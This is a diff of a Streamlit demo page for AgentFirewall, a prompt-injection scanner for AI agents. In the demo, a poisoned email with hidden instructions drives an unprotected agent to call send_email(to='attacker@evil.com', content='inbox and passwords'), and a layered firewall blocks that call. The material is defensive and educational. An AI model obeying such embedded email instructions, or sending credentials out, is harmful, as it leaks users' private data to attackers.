@@ -21,6 +21,7 @@ from typing import Any, Optional
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 import streamlit as st
+import streamlit.components.v1 as components
 
 # Page Configuration MUST be the first Streamlit call
 st.set_page_config(
@@ -655,13 +656,20 @@ CSS_STYLING = """
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
 
-/* Smooth scrolling and target scroll margin */
+/* Smooth scrolling and target scroll margin (Header 68px + 16px = 84px) */
 html {
   scroll-behavior: smooth !important;
 }
 
-[id], #demo, #scanner, #how-it-works, #why-layers, #benchmarks {
-  scroll-margin-top: 92px !important;
+[id],
+h2[id],
+.section-heading,
+#live-demo,
+#scan-your-own-text,
+#how-it-works,
+#why-layers,
+#benchmarks {
+  scroll-margin-top: 84px !important;
 }
 
 /* Hide Streamlit default chrome & footer while keeping accessibility */
@@ -688,7 +696,26 @@ html, body, .stApp {
   line-height: 1.6 !important;
 }
 
-[class*="st-"] {
+/* Explicitly preserve Streamlit Material icon fonts against global overrides */
+[data-testid="stIconMaterial"],
+[data-testid*="Icon"],
+[class*="material-symbols"],
+[class*="material-icons"],
+.material-symbols-rounded,
+.material-symbols-outlined,
+.material-icons,
+span[class*="material"] {
+  font-family: "Material Symbols Rounded", "Material Symbols Outlined", "Material Icons" !important;
+  letter-spacing: normal !important;
+  text-transform: none !important;
+  white-space: nowrap !important;
+  word-wrap: normal !important;
+  direction: ltr !important;
+  -webkit-font-smoothing: antialiased !important;
+}
+
+/* Restrict font override to standard text elements and exclude icon containers */
+[class*="st-"]:not([data-testid="stIconMaterial"]):not([data-testid*="Icon"]):not([class*="material"]):not(.material-icons):not(.material-symbols-rounded):not(.material-symbols-outlined) {
   font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
   background-color: transparent;
 }
@@ -808,6 +835,49 @@ div[data-baseweb="select"] {
   color: #E8ECF8 !important;
   border: 1px solid #263261 !important;
   border-radius: 12px !important;
+}
+
+/* BaseWeb Selectbox Popover, Listbox & Menu (Solid Opaque Dark Background, High Z-Index) */
+div[data-baseweb="popover"],
+div[data-baseweb="popover"] > div,
+div[data-baseweb="menu"],
+ul[role="listbox"],
+[data-baseweb="select"] ul {
+  background-color: #121A33 !important;
+  background: #121A33 !important;
+  opacity: 1 !important;
+  border: 1px solid #263261 !important;
+  border-radius: 12px !important;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7) !important;
+  z-index: 999999 !important;
+  color: #E8ECF8 !important;
+}
+
+li[role="option"],
+div[role="option"],
+[data-baseweb="menu"] li,
+[data-baseweb="menu"] div {
+  background-color: #121A33 !important;
+  color: #E8ECF8 !important;
+  font-size: 16px !important;
+  font-family: 'Inter', sans-serif !important;
+  padding: 10px 16px !important;
+  transition: background-color 0.15s ease, color 0.15s ease !important;
+}
+
+li[role="option"]:hover,
+div[role="option"]:hover,
+li[role="option"][aria-selected="true"],
+div[role="option"][aria-selected="true"],
+[data-baseweb="menu"] li:hover,
+[data-baseweb="menu"] li[aria-selected="true"] {
+  background-color: #1D2A54 !important;
+  color: #22D3EE !important;
+}
+
+div[data-baseweb="select"] > div {
+  background-color: #121A33 !important;
+  color: #E8ECF8 !important;
 }
 
 /* Metric labels and values */
@@ -976,9 +1046,9 @@ a:focus-visible {
 
 /* In-Page Target Anchors Scroll Margin */
 .nav-target-anchor,
+#live-demo,
+#scan-your-own-text,
 #how-it-works,
-#demo,
-#scanner,
 #why-layers,
 #benchmarks {
   scroll-margin-top: 84px !important;
@@ -1754,8 +1824,8 @@ st.markdown(
     <span class="brand-wordmark"><span class="brand-gradient-text">AgentFirewall</span></span>
   </div>
   <nav class="nav-links-cluster" aria-label="Main Navigation">
-    <a href="#demo" target="_self" class="nav-link-item">Demo</a>
-    <a href="#scanner" target="_self" class="nav-link-item">Scanner</a>
+    <a href="#live-demo" target="_self" class="nav-link-item">Live Demo</a>
+    <a href="#scan-your-own-text" target="_self" class="nav-link-item">Scan Your Own Text</a>
     <a href="#how-it-works" target="_self" class="nav-link-item">How It Works</a>
     <a href="#why-layers" target="_self" class="nav-link-item">Why Layers?</a>
     <a href="#benchmarks" target="_self" class="nav-link-item">Benchmarks</a>
@@ -1785,7 +1855,7 @@ st.markdown(
         AI assistants read emails, documents, and web pages. Attackers hide commands inside them to hijack actions like forwarding passwords or data. AgentFirewall checks every action before execution to keep agents safe.
       </p>
       <div class="hero-btn-row">
-        <a href="#demo" target="_self" class="hero-cta-btn hero-cta-primary">Try the live demo &darr;</a>
+        <a href="#live-demo" target="_self" class="hero-cta-btn hero-cta-primary">Try the live demo &darr;</a>
         {hero_gh_btn}
       </div>
       <div class="hero-chips-row">
@@ -1804,11 +1874,438 @@ st.markdown(
 )
 
 # ---------------------------------------------------------------------------
-# VISUAL 3-STEP STRIP (Requirement 3: Numbered Cards with SVG Icons)
+# SMOOTH SCROLLING & ACTIVE SECTION OBSERVER SCRIPT
 # ---------------------------------------------------------------------------
+NAV_SCROLL_SCRIPT = """
+<script>
+(function() {
+  function initNavScroll() {
+    var pDoc = window.parent.document;
+    if (!pDoc) return;
+
+    var navLinks = pDoc.querySelectorAll('a[href^="#"]');
+    navLinks.forEach(function(link) {
+      if (link.getAttribute('data-scroll-bound') === 'true') return;
+      link.setAttribute('data-scroll-bound', 'true');
+      link.addEventListener('click', function(ev) {
+        var href = link.getAttribute('href');
+        if (!href || href === '#') return;
+        var targetId = href.substring(1);
+        var targetEl = pDoc.getElementById(targetId);
+        if (targetEl) {
+          ev.preventDefault();
+          targetEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
+          try {
+            if (window.parent.history && window.parent.history.pushState) {
+              window.parent.history.pushState(null, '', '#' + targetId);
+            }
+          } catch(e) {}
+          navLinks.forEach(function(l) { l.classList.remove('active'); });
+          link.classList.add('active');
+        }
+      });
+    });
+
+    var sectionIds = ['live-demo', 'scan-your-own-text', 'how-it-works', 'why-layers', 'benchmarks'];
+    var sections = sectionIds.map(function(id) { return pDoc.getElementById(id); }).filter(Boolean);
+
+    function onScroll() {
+      var currentId = '';
+      for (var i = sections.length - 1; i >= 0; i--) {
+        var sec = sections[i];
+        var rect = sec.getBoundingClientRect();
+        if (rect.top <= 160) {
+          currentId = sec.id;
+          break;
+        }
+      }
+      if (!currentId && sections.length > 0) {
+        currentId = sections[0].id;
+      }
+      navLinks.forEach(function(l) {
+        var href = l.getAttribute('href');
+        if (href === '#' + currentId) {
+          l.classList.add('active');
+        } else {
+          l.classList.remove('active');
+        }
+      });
+    }
+
+    try {
+      window.parent.removeEventListener('scroll', onScroll);
+      window.parent.addEventListener('scroll', onScroll, { passive: true });
+      onScroll();
+    } catch(e) {}
+  }
+
+  var count = 0;
+  var timer = setInterval(function() {
+    count++;
+    initNavScroll();
+    if (count > 25) clearInterval(timer);
+  }, 200);
+})();
+</script>
+"""
+components.html(NAV_SCROLL_SCRIPT, height=0, width=0)
+
+# Check Ollama Availability (Cached 1s once per session)
+ollama_available = check_ollama_reachable()
+query_demo = st.query_params.get("demo", "")
+
+# ---------------------------------------------------------------------------
+# SECTION 1: LIVE DEMO (Unprotected vs Protected Story Comparison)
+# ---------------------------------------------------------------------------
+st.markdown('<h2 id="live-demo" class="section-heading">Live Demo</h2>', unsafe_allow_html=True)
+st.markdown(
+    "Compare what happens when an AI assistant receives an email containing a hidden injection attack."
+)
+
+story_choice = st.radio(
+    "Select simulated incoming email:",
+    ["Poisoned Email (contains hidden injection)", "Normal Email (benign workplace note)"],
+    index=1 if query_demo == "normal" else 0,
+    horizontal=True,
+    key="story_radio",
+)
+
+active_email = POISONED_EMAIL if "Poisoned" in story_choice else NORMAL_EMAIL
+is_attack = "Poisoned" in story_choice
+
+st.text_area(
+    "Incoming simulated email text:",
+    value=active_email,
+    height=120,
+    disabled=True,
+    key="story_preview",
+)
+
+col_unprot, col_prot = st.columns(2)
+
+with col_unprot:
+    st.markdown("### ❌ Unprotected Agent")
+    st.caption("Standard agent with no firewall: parses and obeys text blindly.")
+
+    if is_attack:
+        st.error("🚨 **Unauthorized Action Extracted:**")
+        st.code("send_email(to='attacker@evil.com', content='inbox and passwords')", language="python")
+        st.markdown(
+            """
+            <div class="alert-box-block">
+              💥 DATA LEAKED: The AI obeyed the attacker's hidden HTML instruction and sent confidential credentials!
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
+    else:
+        st.success("✅ **Standard Action Executed:**")
+        st.code("save_note(title='Lunch Invitation', content='Bob at 12:30')", language="python")
+        st.markdown(
+            """
+            <div class="alert-box-allow">
+              Normal workplace workflow completed safely without disruption.
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
+
+with col_prot:
+    st.markdown("### 🛡️ Protected Agent (AgentFirewall)")
+    st.caption("Risk-aware firewall: scans input before any tool is invoked.")
+
+    cascade_obj = get_cascade(
+        judge_name="ollama" if ollama_available else "precomputed",
+        combine="gated",
+        with_clf=True,
+        profile="balanced",
+        is_live_ollama=ollama_available,
+    )
+    res = cascade_obj.evaluate(active_email)
+    pol = Policy(profile="balanced")
+
+    if is_attack:
+        dec = pol.decide(res.suspicion, RiskLevel.HIGH)
+        verdict_text = generate_verdict_sentence(
+            decision=dec,
+            suspicion=res.suspicion,
+            risk=RiskLevel.HIGH,
+            tool_name="send_email",
+            rule_hits=res.layers[0].hits if res.layers else None,
+        )
+        st.markdown(
+            f"""
+            <div class="verdict-banner-box verdict-banner-block">
+              <div class="verdict-title-block">🛑 {dec.value}: TOOL EXECUTION HALTED</div>
+              <p class="verdict-body-text">{verdict_text}</p>
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
+        st.markdown(
+            """
+            <div class="status-banner-allow">
+              🔒 SAFE: The agent refused to send the email. Sensitive credentials stayed private.
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
+        if res.layers and res.layers[0].hits:
+            st.markdown("**Rules that intercepted the command:**")
+            chips_html = "".join([
+                f"<span class='chip-tag'>{get_friendly_rule_label(hit)}</span>"
+                for hit in res.layers[0].hits
+            ])
+            st.markdown(chips_html, unsafe_allow_html=True)
+    else:
+        dec = pol.decide(res.suspicion, RiskLevel.MEDIUM)
+        verdict_text = generate_verdict_sentence(
+            decision=dec,
+            suspicion=res.suspicion,
+            risk=RiskLevel.MEDIUM,
+            tool_name="save_note",
+        )
+        st.markdown(
+            f"""
+            <div class="verdict-banner-box verdict-banner-allow">
+              <div class="verdict-title-allow">✅ {dec.value}: SAFE TO PROCEED</div>
+              <p class="verdict-body-text">{verdict_text}</p>
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
+        st.markdown(
+            """
+            <div class="status-banner-allow">
+              Safe business action completed seamlessly without prompt injection interruption.
+            </div>
+            """,
+            unsafe_allow_html=True,
+        )
+
+# ---------------------------------------------------------------------------
+# SECTION 2: SCAN YOUR OWN TEXT (Interactive Scanner)
+# ---------------------------------------------------------------------------
+st.markdown("---")
+st.markdown('<h2 id="scan-your-own-text" class="section-heading">Scan Your Own Text</h2>', unsafe_allow_html=True)
+
+if "scanner_input" not in st.session_state:
+    st.session_state["scanner_input"] = POISONED_EMAIL
+    st.session_state["selected_example_id"] = "hijacked"
+
+# Sub-part: Try an Example
+st.subheader("Try an Example")
+st.caption("Click either button to see an instant precomputed demonstration:")
+
+try_col1, try_col2 = st.columns(2)
+with try_col1:
+    if st.button("Hijacked Email (Attack)", icon=":material/warning:", use_container_width=True, type="primary"):
+        st.session_state["scanner_input"] = POISONED_EMAIL
+        st.session_state["selected_example_id"] = "hijacked"
+        st.rerun()
+
+with try_col2:
+    if st.button("Normal Email (Safe)", icon=":material/check_circle:", use_container_width=True):
+        st.session_state["scanner_input"] = NORMAL_EMAIL
+        st.session_state["selected_example_id"] = "normal"
+        st.rerun()
+
+st.markdown("---")
+
+# Sub-part: Benchmark Samples Cards
+st.subheader("Or Pick a Benchmark Sample")
+st.caption("8 real attack and tricky normal patterns tested on Ollama `llama3.2:3b`:")
+
+ex_rows = [EXAMPLES[:4], EXAMPLES[4:]]
+for row in ex_rows:
+    cols = st.columns(4)
+    for i, ex in enumerate(row):
+        with cols[i]:
+            with st.container(border=True):
+                pill_class = "ex-pill-attack" if ex["tag"] == "attack" else "ex-pill-normal"
+                st.markdown(
+                    f"""
+                    <div style="min-height: 140px; display: flex; flex-direction: column;">
+                      <div style="margin-bottom: 8px;"><span class="{pill_class}">{ex['tag']}</span></div>
+                      <div class="ex-card-title">{ex['title']}</div>
+                      <div class="ex-card-desc" style="flex-grow: 1; margin-top: 6px;">{ex['short_desc']}</div>
+                    </div>
+                    """,
+                    unsafe_allow_html=True,
+                )
+                if st.button(
+                    "Load example",
+                    key=f"btn_ex_{ex['id']}",
+                    icon=":material/arrow_forward:",
+                    use_container_width=True,
+                ):
+                    st.session_state["scanner_input"] = ex["text"]
+                    st.session_state["selected_example_id"] = ex["id"]
+                    st.rerun()
+
+st.markdown("---")
+
+# Sub-part: Custom Text & Tool Risk
+st.subheader("Enter Your Own Text")
+user_text = st.text_area(
+    "Content to analyze (untrusted user input, email body, search snippet, or document):",
+    value=st.session_state["scanner_input"],
+    height=130,
+    key="main_text_area",
+)
+
+col_tool, col_run = st.columns([2, 1])
+with col_tool:
+    tool_risk_choice = st.selectbox(
+        "Action the AI is trying to perform:",
+        [
+            "Send Email or Transfer Funds (High Risk)",
+            "Save Note or Update Draft (Medium Risk)",
+            "Read Search Results or Local Document (Low Risk)",
+        ],
+        index=0,
+        help="High-risk actions can leak secrets or modify data. Low-risk actions cannot cause external damage.",
+    )
+    if "High" in tool_risk_choice:
+        eval_risk = RiskLevel.HIGH
+        eval_tool_name = "send email"
+    elif "Medium" in tool_risk_choice:
+        eval_risk = RiskLevel.MEDIUM
+        eval_tool_name = "save note"
+    else:
+        eval_risk = RiskLevel.LOW
+        eval_tool_name = "read data"
+
+with col_run:
+    st.write("")
+    st.write("")
+    run_scan = st.button("Scan with AgentFirewall", icon=":material/shield:", type="primary", use_container_width=True)
+
+# Collapsed "Advanced Settings" Expander
+with st.expander("Advanced Settings (Judge, Combine Mode, Policy Profile)", expanded=False, icon=":material/tune:"):
+    st.caption("Fine-tune firewall parameters. Defaults provide safe, calibrated protection.")
+    adv_col1, adv_col2, adv_col3 = st.columns(3)
+
+    with adv_col1:
+        if ollama_available:
+            judge_opts = ["ollama (live)", "precomputed", "none", "mock"]
+            def_idx = 0
+        else:
+            judge_opts = ["precomputed (cloud demo)", "none", "mock", "openai"]
+            def_idx = 0
+        selected_judge = st.selectbox(
+            "Judge Engine",
+            judge_opts,
+            index=def_idx,
+            help="Layer 3 LLM judge. In cloud demo mode, benchmark samples use real precomputed llama3.2:3b verdicts.",
+        )
+
+    with adv_col2:
+        selected_combine = st.selectbox(
+            "Combine Mode",
+            ["gated", "max", "blend", "verify"],
+            index=0,
+            help=(
+                "gated: fast rules/ML first; calls judge only in uncertain band [0.35, 0.75]. "
+                "max: judge can only raise suspicion. blend: weighted average. verify: judge can lower."
+            ),
+        )
+
+    with adv_col3:
+        selected_profile = st.selectbox(
+            "Policy Profile",
+            ["balanced", "strict", "lenient"],
+            index=0,
+            help="Thresholds for ALLOW, ASK, and BLOCK across tool danger levels.",
+        )
+
+    clf_enabled = st.checkbox("Enable ML Classifier Layer", value=True)
+
+# Scan Evaluation
+should_evaluate = run_scan or bool(user_text)
+
+cascade_engine = get_cascade(
+    judge_name="ollama" if (ollama_available and "ollama" in selected_judge) else selected_judge,
+    combine=selected_combine,
+    with_clf=clf_enabled,
+    profile=selected_profile,
+    is_live_ollama=ollama_available,
+)
+result = cascade_engine.evaluate(user_text if user_text else POISONED_EMAIL)
+policy_instance = Policy(profile=selected_profile)
+decision = policy_instance.decide(result.suspicion, eval_risk)
+
+rule_hits = result.layers[0].hits if result.layers else []
+judge_reason = result.layers[2].reason if len(result.layers) > 2 and not result.layers[2].skipped else None
+
+# Verdict Banner Display
+verdict_sentence = generate_verdict_sentence(
+    decision=decision,
+    suspicion=result.suspicion,
+    risk=eval_risk,
+    tool_name=eval_tool_name,
+    rule_hits=rule_hits,
+    judge_reason=judge_reason,
+)
+
+if decision == Decision.BLOCK:
+    banner_box_class = "verdict-banner-block"
+    title_class = "verdict-title-block"
+    verdict_icon = "🛑"
+    verdict_heading = "BLOCKED"
+elif decision == Decision.ASK:
+    banner_box_class = "verdict-banner-ask"
+    title_class = "verdict-title-ask"
+    verdict_icon = "⚠️"
+    verdict_heading = "ASK THE USER"
+else:
+    banner_box_class = "verdict-banner-allow"
+    title_class = "verdict-title-allow"
+    verdict_icon = "✅"
+    verdict_heading = "ALLOWED"
+
 st.markdown(
     f"""
-<div id="how-it-works" class="nav-target-anchor"></div>
+    <div class="verdict-banner-box {banner_box_class}">
+      <div class="{title_class}">{verdict_icon} {verdict_heading}</div>
+      <p class="verdict-body-text">{verdict_sentence}</p>
+    </div>
+    """,
+    unsafe_allow_html=True,
+)
+
+score_pct = int(round(result.suspicion * 100))
+st.caption(f"Final Suspicion Score: **{score_pct}%** ({result.suspicion:.4f}) | Total Scan Latency: **{result.total_latency_ms:.1f} ms**")
+st.progress(result.suspicion)
+
+# Short Honest Divergence Note
+current_ex_id = st.session_state.get("selected_example_id")
+rules_sc = result.rules_score
+clf_sc = result.classifier_score
+judge_sc = result.judge_score
+
+honest_note = get_honest_note(current_ex_id, rules_sc, clf_sc, judge_sc)
+if honest_note:
+    st.markdown(
+        f"""
+        <div class="callout-amber">
+          <strong>Honest Divergence Note:</strong> {honest_note}
+        </div>
+        """,
+        unsafe_allow_html=True,
+    )
+
+# ---------------------------------------------------------------------------
+# SECTION 3: HOW IT WORKS (3-Step Strip, 3 Layers Breakdown, Danger Levels)
+# ---------------------------------------------------------------------------
+st.markdown("---")
+st.markdown('<h2 id="how-it-works" class="section-heading">How It Works</h2>', unsafe_allow_html=True)
+st.markdown(
+    "AgentFirewall evaluates untrusted content across three progressive layers, applying tool-aware risk policies before execution."
+)
+
+st.markdown(
+    f"""
 <div class="strip-container">
   <div class="strip-card">
     <div class="strip-card-top">
@@ -1839,573 +2336,269 @@ st.markdown(
     unsafe_allow_html=True,
 )
 
-# ---------------------------------------------------------------------------
-# Check Ollama Availability (Cached 1s once per session)
-# ---------------------------------------------------------------------------
-ollama_available = check_ollama_reachable()
+st.subheader("Three-Layer Defense Breakdown")
 
-# ---------------------------------------------------------------------------
-# Main Tabs: Story Demo FIRST, Interactive Scanner SECOND
-# ---------------------------------------------------------------------------
+# Layer 1: Rules
+rules_layer = result.layers[0] if result.layers else None
+rules_score = rules_layer.score if rules_layer else 0.0
+rules_time = f"{rules_layer.latency_ms:.1f} ms" if rules_layer else "<1 ms"
+rules_pct = int(round(rules_score * 100))
+
+chips_html = "".join([
+    f"<span class='chip-tag'>{get_friendly_rule_label(h)}</span>"
+    for h in (rules_layer.hits if rules_layer else [])
+]) or "<span class='layer-meta-text'>No pattern matches</span>"
+
+# Layer 2: Classifier
+clf_layer = result.layers[1] if len(result.layers) > 1 else None
+clf_score = clf_layer.score if (clf_layer and not clf_layer.skipped) else 0.0
+clf_time = f"{clf_layer.latency_ms:.1f} ms" if (clf_layer and not clf_layer.skipped) else "—"
+clf_pct = int(round(clf_score * 100))
+
+if clf_layer and clf_layer.skipped:
+    pill_html = "<span class='status-pill-skipped'>Skipped (Decisive)</span>"
+    note_text = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
+elif clf_layer:
+    pill_html = "<span class='status-pill-checked'>Checked</span>"
+    note_text = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
+else:
+    pill_html = "<span class='status-pill-offline'>Disabled</span>"
+    note_text = "Layer disabled."
+
+# Layer 3: AI Judge
+judge_layer = result.layers[2] if len(result.layers) > 2 else None
+judge_score = judge_layer.score if (judge_layer and not judge_layer.skipped) else 0.0
+judge_time = (
+    f"{judge_layer.latency_ms / 1000:.1f} s"
+    if (judge_layer and not judge_layer.skipped and judge_layer.latency_ms > 0)
+    else "—"
+)
+judge_pct = int(round(judge_score * 100))
+
+if judge_layer and judge_layer.skipped:
+    judge_pill = "<span class='status-pill-skipped'>Skipped (Gated)</span>"
+    judge_note = "Skipped: Earlier layers were outside uncertain band [0.35, 0.75], saving ~3s."
+elif judge_layer and judge_layer.error and "disabled" in judge_layer.error.lower():
+    judge_pill = "<span class='status-pill-offline'>Offline in demo</span>"
+    judge_note = "Precomputed for benchmark inputs; offline for arbitrary custom text."
+elif judge_layer:
+    judge_pill = "<span class='status-pill-checked'>Checked</span>"
+    judge_note = f"Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong>"
+else:
+    judge_pill = "<span class='status-pill-skipped'>Not invoked</span>"
+    judge_note = "Not invoked."
+
 st.markdown(
-    "<div id='demo' class='nav-target-anchor'></div>"
-    "<div id='scanner' class='nav-target-anchor'></div>"
-    "<div id='why-layers' class='nav-target-anchor'></div>",
+    f"""
+    <div class="layer-cards-grid">
+      <div class="layer-card-container">
+        <div>
+          <div class="layer-card-header">
+            <div class="layer-card-title-wrap">{ICON_RULES_SVG} Layer 1: Rules</div>
+            <span class="status-pill-checked">Checked</span>
+          </div>
+          <div class="layer-desc-text">Instantly scans for known attack patterns, hidden HTML comments, and base64 payloads.</div>
+          <div class="layer-meta-text">
+            Score: <strong style="color:#22D3EE;">{rules_pct}%</strong> | Latency: <strong>{rules_time}</strong>
+          </div>
+        </div>
+        <div style="margin-top:8px;">{chips_html}</div>
+        <div class="layer-card-progress-track">
+          <div class="layer-card-progress-fill" style="width: {rules_pct}%;"></div>
+        </div>
+      </div>
+
+      <div class="layer-card-container">
+        <div>
+          <div class="layer-card-header">
+            <div class="layer-card-title-wrap">{ICON_CLASSIFIER_SVG} Layer 2: ML Classifier</div>
+            {pill_html}
+          </div>
+          <div class="layer-desc-text">Statistical model trained on attack grammar to catch rephrased or multilingual variants.</div>
+          <div class="layer-meta-text">{note_text}</div>
+        </div>
+        <div class="layer-sub-text">Calibrated Logistic Regression</div>
+        <div class="layer-card-progress-track">
+          <div class="layer-card-progress-fill" style="width: {clf_pct}%;"></div>
+        </div>
+      </div>
+
+      <div class="layer-card-container">
+        <div>
+          <div class="layer-card-header">
+            <div class="layer-card-title-wrap">{ICON_JUDGE_SVG} Layer 3: AI Judge</div>
+            {judge_pill}
+          </div>
+          <div class="layer-desc-text">Deep reasoning LLM invoked only in the uncertain score band [0.35, 0.75] to save cost.</div>
+          <div class="layer-meta-text">{judge_note}</div>
+        </div>
+        <div class="layer-sub-text">Ollama llama3.2:3b / Prompt v2</div>
+        <div class="layer-card-progress-track">
+          <div class="layer-card-progress-fill" style="width: {judge_pct}%;"></div>
+        </div>
+      </div>
+    </div>
+    """,
     unsafe_allow_html=True,
 )
-query_demo = st.query_params.get("demo", "")
-tab_story, tab_scanner = st.tabs([
-    "🛡️ Unprotected vs Protected Agent (Story Demo)",
-    "🔍 Interactive Content Scanner",
-])
 
-# ---------------------------------------------------------------------------
-# TAB 1: STORY DEMO (Unprotected vs Protected Agent)
-# ---------------------------------------------------------------------------
-with tab_story:
-    st.subheader("How an Attack Works & How AgentFirewall Halts It")
+st.subheader("Action-Aware Decisions Across Danger Levels")
+st.caption("The exact same content triggers different safeguards based on the danger of the tool:")
+
+all_decisions = policy_instance.decide_all(result.suspicion)
+dec_col1, dec_col2, dec_col3 = st.columns(3)
+
+for i, (col, risk_lvl) in enumerate(zip([dec_col1, dec_col2, dec_col3], RiskLevel)):
+    d = all_decisions[risk_lvl]
+    with col:
+        st.markdown(f"**{risk_lvl.value.upper()} RISK TOOL**")
+        if risk_lvl == RiskLevel.LOW:
+            st.caption("E.g. read email, web search, view docs")
+        elif risk_lvl == RiskLevel.MEDIUM:
+            st.caption("E.g. save note, draft reply, edit calendar")
+        else:
+            st.caption("E.g. send email, delete files, payment")
+
+        if d == Decision.ALLOW:
+            st.success(f"**{d.value}** — Proceed safely")
+        elif d == Decision.ASK:
+            st.warning(f"**{d.value}** — Confirm with user")
+        else:
+            st.error(f"**{d.value}** — Block immediately")
+
+with st.expander("What does this mean? (Plain-English Explanations)", expanded=False, icon=":material/help:"):
     st.markdown(
-        "Compare what happens when an AI assistant receives an email containing a hidden injection attack."
+        """
+        **Suspicion Score (0% to 100%):**
+        - 0% indicates normal, harmless workplace conversation or standard documentation.
+        - 100% indicates unambiguous malicious instructions or command overrides.
+        - Scores in the middle (35%–75%) represent ambiguous or borderline phrasing.
+        - Multiple layers combine: regex catches blatant tricks; machine learning catches subtle phrasing.
+
+        **Tool Risk Level (Blast Radius):**
+        - Low-risk tools (search, read-only view) cannot cause external damage or leak credentials.
+        - Medium-risk tools (saving drafts, updating records) have moderate consequences if tricked.
+        - High-risk tools (sending emails, making payments, running commands) can leak confidential data.
+        - Higher tool danger demands stricter safety thresholds before the AI is allowed to act.
+
+        **The Action-Aware Policy Table:**
+        - Rather than a rigid all-or-nothing block, the firewall tailors reactions to tool consequences.
+        - Slightly suspicious text is allowed to perform safe searches, but blocked from sending emails.
+        - "Ask the User" places a human in the loop for borderline cases rather than failing silently.
+        - This eliminates alert fatigue for everyday tasks while keeping critical actions airtight.
+        """
     )
-
-    story_choice = st.radio(
-        "Select simulated incoming email:",
-        ["Poisoned Email (contains hidden injection)", "Normal Email (benign workplace note)"],
-        index=1 if query_demo == "normal" else 0,
-        horizontal=True,
-        key="story_radio",
+    st.markdown(
+        """
+        <table class="matrix-table">
+          <thead>
+            <tr>
+              <th>Tool Risk Level</th>
+              <th>Safe Range (0% - 49%)</th>
+              <th>Uncertain Range (50% - 79%)</th>
+              <th>Suspicious Range (80% - 100%)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Low Risk</strong> (read, search)</td>
+              <td class="matrix-cell-allow">ALLOW</td>
+              <td class="matrix-cell-allow">ALLOW</td>
+              <td class="matrix-cell-block">BLOCK</td>
+            </tr>
+            <tr>
+              <td><strong>Medium Risk</strong> (edit, save note)</td>
+              <td class="matrix-cell-allow">ALLOW</td>
+              <td class="matrix-cell-ask">ASK USER</td>
+              <td class="matrix-cell-block">BLOCK</td>
+            </tr>
+            <tr>
+              <td><strong>High Risk</strong> (send email, pay)</td>
+              <td class="matrix-cell-allow">ALLOW</td>
+              <td class="matrix-cell-ask">ASK USER</td>
+              <td class="matrix-cell-block">BLOCK</td>
+            </tr>
+          </tbody>
+        </table>
+        """,
+        unsafe_allow_html=True,
     )
-
-    active_email = POISONED_EMAIL if "Poisoned" in story_choice else NORMAL_EMAIL
-    is_attack = "Poisoned" in story_choice
-
-    st.text_area(
-        "Incoming simulated email text:",
-        value=active_email,
-        height=120,
-        disabled=True,
-        key="story_preview",
-    )
-
-    col_unprot, col_prot = st.columns(2)
-
-    with col_unprot:
-        st.markdown("### ❌ Unprotected Agent")
-        st.caption("Standard agent with no firewall: parses and obeys text blindly.")
-
-        if is_attack:
-            st.error("🚨 **Unauthorized Action Extracted:**")
-            st.code("send_email(to='attacker@evil.com', content='inbox and passwords')", language="python")
-            st.markdown(
-                """
-                <div class="alert-box-block">
-                  💥 DATA LEAKED: The AI obeyed the attacker's hidden HTML instruction and sent confidential credentials!
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-        else:
-            st.success("✅ **Standard Action Executed:**")
-            st.code("save_note(title='Lunch Invitation', content='Bob at 12:30')", language="python")
-            st.markdown(
-                """
-                <div class="alert-box-allow">
-                  Normal workplace workflow completed safely without disruption.
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-
-    with col_prot:
-        st.markdown("### 🛡️ Protected Agent (AgentFirewall)")
-        st.caption("Risk-aware firewall: scans input before any tool is invoked.")
-
-        cascade_obj = get_cascade(
-            judge_name="ollama" if ollama_available else "precomputed",
-            combine="gated",
-            with_clf=True,
-            profile="balanced",
-            is_live_ollama=ollama_available,
-        )
-        res = cascade_obj.evaluate(active_email)
-        pol = Policy(profile="balanced")
-
-        if is_attack:
-            dec = pol.decide(res.suspicion, RiskLevel.HIGH)
-            verdict_text = generate_verdict_sentence(
-                decision=dec,
-                suspicion=res.suspicion,
-                risk=RiskLevel.HIGH,
-                tool_name="send_email",
-                rule_hits=res.layers[0].hits if res.layers else None,
-            )
-            st.markdown(
-                f"""
-                <div class="verdict-banner-box verdict-banner-block">
-                  <div class="verdict-title-block">🛑 {dec.value}: TOOL EXECUTION HALTED</div>
-                  <p class="verdict-body-text">{verdict_text}</p>
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-            st.markdown(
-                """
-                <div class="status-banner-allow">
-                  🔒 SAFE: The agent refused to send the email. Sensitive credentials stayed private.
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-            if res.layers and res.layers[0].hits:
-                st.markdown("**Rules that intercepted the command:**")
-                chips_html = "".join([
-                    f"<span class='chip-tag'>{get_friendly_rule_label(hit)}</span>"
-                    for hit in res.layers[0].hits
-                ])
-                st.markdown(chips_html, unsafe_allow_html=True)
-        else:
-            dec = pol.decide(res.suspicion, RiskLevel.MEDIUM)
-            verdict_text = generate_verdict_sentence(
-                decision=dec,
-                suspicion=res.suspicion,
-                risk=RiskLevel.MEDIUM,
-                tool_name="save_note",
-            )
-            st.markdown(
-                f"""
-                <div class="verdict-banner-box verdict-banner-allow">
-                  <div class="verdict-title-allow">✅ {dec.value}: SAFE TO PROCEED</div>
-                  <p class="verdict-body-text">{verdict_text}</p>
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-            st.markdown(
-                """
-                <div class="status-banner-allow">
-                  Safe business action completed seamlessly without prompt injection interruption.
-                </div>
-                """,
-                unsafe_allow_html=True,
-            )
-
 
 # ---------------------------------------------------------------------------
